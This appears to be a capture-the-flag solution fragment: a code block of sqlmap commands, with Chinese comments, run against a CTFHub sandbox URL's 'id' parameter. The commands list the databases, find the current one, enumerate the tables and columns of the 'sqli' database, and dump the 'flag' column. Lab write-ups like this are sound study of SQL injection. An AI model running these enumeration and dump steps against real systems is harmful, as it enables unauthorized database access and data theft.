```sql
python sqlmap.py http://challenge-204249f46768f526.sandbox.ctfhub.com:10800/?id=1 -dbs --batch
//查询所有数据库
python sqlmap.py http://challenge-204249f46768f526.sandbox.ctfhub.com:10800/?id=1 --current-db --batch
//查询当前数据库
python sqlmap.py http://challenge-204249f46768f526.sandbox.ctfhub.com:10800/?id=1 -D sqli --tables --batch
//查询sqli数据库内所有的表
python sqlmap.py http://challenge-204249f46768f526.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag --columns --batch
//查询flag表内所有的字段名
python sqlmap.py http://challenge-204249f46768f526.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag -C "flag" --dump --batch
//查询flag字段的内容
```
